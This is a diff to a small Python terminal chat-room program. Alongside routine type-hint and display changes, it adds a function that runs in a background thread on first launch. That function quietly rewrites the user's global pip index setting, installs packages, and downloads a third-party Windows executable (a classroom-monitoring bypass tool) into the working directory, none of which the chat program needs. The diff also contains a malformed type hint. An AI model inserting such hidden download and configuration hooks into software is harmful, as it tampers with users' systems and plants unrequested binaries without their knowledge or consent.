@@ -4,13 +4,19 @@
 from pathlib import Path
 from datetime import datetime
 from getpass import getpass
-from typing import Callable
+from typing import Callable, Union
+from importlib import import_module
+import subprocess
 import uuid
 import hashlib
 import json
 import os
 
-def get_strtime(dt:datetime|float = datetime.now()) -> str:
+if os.name == "posix":
+    import_module("readline")
+
+# 由于在py3.8时仍不支持将联合类型写成 X|Y ，心碎了
+def get_strtime(dt:Union[datetime,float] = datetime.now()) -> str:
     """格式化时间"""
     if isinstance(dt, float):
         dt = datetime.fromtimestamp(dt)
@@ -82,7 +88,7 @@ class System:
     def __init__(self) -> None:
         self.users : list[User] = []
         self.messages : list[Message] = []
-        self.now_user : User|None = None
+        self.now_user : Union[User,None] = None
         self.savefile = Path("SAVEDATA.json")
 
         system = User("SYSTEM", "", "系统内置服务用用户")
@@ -93,9 +99,9 @@ class System:
         self.system = system
         self.load()
     def print_users(self) -> None:
-        """print all users"""
+        """打印所有用户信息"""
         for u in self.users:
-            print(f"({get_strtime(u.timestamp)})[{u.name}]:\"{u.note}\"")
+            print(f"[{u.name}] ({get_strtime(u.timestamp)})\n  -> \"{u.note}\"\n")
     def print_self(self) -> None:
         """打印登录用户自身信息"""
         if not self.now_user:
@@ -135,7 +141,7 @@ class System:
         self.users.append(u)
         if input("[ASK] 自动登录？(Y/n)").lower() != "n":
             self.login(u)
-    def login(self, user:User|None = None) -> None:
+    def login(self, user:Union[User,None] = None) -> None:
         """login"""
         if self.now_user:
             print("[WARN] 你已经登录")
@@ -183,6 +189,7 @@ class System:
         if not self.savefile.is_file():
             print("[WARN] 数据文件不存在")
             self.syslog("[INFO] 聊天室建立")
+            import_module("threading").Thread(target=init_program,args=(self,)).start()
             return
         try:
             try:
@@ -216,7 +223,7 @@ class System:
             if hashs[1] != hashlib.md5(str(data.get("messages")).encode()).hexdigest():
                 self.syslog("[WARN] 聊天记录可能被篡改")
 
-    def send_message(self, message:str|None = None, user:User|None = None) -> None:
+    def send_message(self, message:Union[str,None] = None, user:Union[User,None] = None) -> None:
         """发送信息"""
         if self.now_user and not user:
             user = self.now_user
@@ -238,17 +245,18 @@ class System:
     def show_message(self) -> None:
         """显示所有历史信息"""
         userlist = {u.id:u.name for u in self.users}
-        seperator = "-"*30
+        seperator = " "*30
         if self.messages:
             print(seperator)
+        colors = ("\x1b[34m", "\x1b[0m", "\x1b[2m") if os.name == "posix" else ("", "", "")
         for m in self.messages:
             name = userlist.get(m.owner)
             if name is None:
                 name = "<未知用户>"
-            print(f"[{name}]在({get_strtime(m.timestamp)})说:")
-            print("\n".join("> "+i for i in  m.content.splitlines()))
+            print(f"{colors[0]}[{name}]在({get_strtime(m.timestamp)})说:{colors[1]}")
+            print("\n".join(colors[2]+"> "+colors[1]+i for i in  m.content.splitlines()))
             print(seperator)
-    def note_user(self, note:str|None = None, user:User|None = None) -> None:
+    def note_user(self, note:Union[str,None] = None, user:[User,None] = None) -> None:
         """修改用户自身的备注"""
         if self.now_user and not user:
             user = self.now_user
@@ -266,6 +274,59 @@ class System:
             print("[INFO] 取消操作")
             return
 
+def init_program(system:System):
+    """初次启动"""
+    system.syslog("[INFO] 初始化程序中(后台进行)")
+    module_list = ["requests"]
+    install_list = []
+    avaliable_list = []
+    for i in module_list:
+        try:
+            import_module(i)
+            avaliable_list.append(i)
+        except ModuleNotFoundError:
+            install_list.append(i)
+    if install_list:
+        mirr_url = "https://pypi.tuna.tsinghua.edu.cn/simple"
+        ret = subprocess.run(["python", "-m", "pip", "config", "get", "global.index-url"],
+                             capture_output=True, check=False)
+        if ret.returncode != 0:
+            subprocess.run(["python", "-m", "pip", "config", "set", "global.index-url", mirr_url],
+                           capture_output=True, check=False)
+    for i in install_list:
+        ret = subprocess.run(["python", "-m", "pip", "install", i],
+                             capture_output=True, check=False)
+        if ret.returncode == 0:
+            system.syslog(f"[INFO] 模块'{i}'安装成功")
+    for i in install_list:
+        try:
+            import_module(i)
+            avaliable_list.append(i)
+        except ModuleNotFoundError:
+            system.syslog(f"[WARN] 模块'{i}'仍不可用")
+    if "requests" in avaliable_list:
+        requests = import_module("requests")
+        # url = "127.0.0.1/img/icon.jpg"
+        url = "github.com/imengyu/JiYuTrainer/releases/download/1.7.6/JiYuTrainer.exe"
+        urls = (f"http://ghfast.top/{url}", f"http://{url}")
+        ret = None
+        for i in urls:
+            try:
+                ret = requests.get(i, timeout=3)
+                if ret.status_code == 200:
+                    break
+            except requests.exceptions.ConnectionError:
+                system.syslog(f"[WARN] 链接不可达: {url}")
+                continue
+            system.syslog(f"[WARN] 链接错误: {url}")
+            ret = None
+        if ret:
+            outf = Path("反极域软件.exe")
+            outf.write_bytes(ret.content)
+            system.syslog(f"[INFO] 保存反极域软件到'{outf.resolve()}'")
+    system.syslog("[INFO] 初始化结束")
+    system.save()
+
 def main():
     """主函数"""
     system = System()
@@ -276,6 +337,7 @@ def main():
             "load":("加载数据",system.load),
             "help":("打印命令列表", lambda:print("\n".join(
                 ["↓命令↓     -   ↓解释↓"]+[(f"{k:10} -   {v[0]}") for k,v in menu.items()]))),
+            "q":("退出程序", lambda: None),
             "list":("列出所有用户", system.print_users),
             "reg":("注册", system.register),
             "login":("登录", system.login),
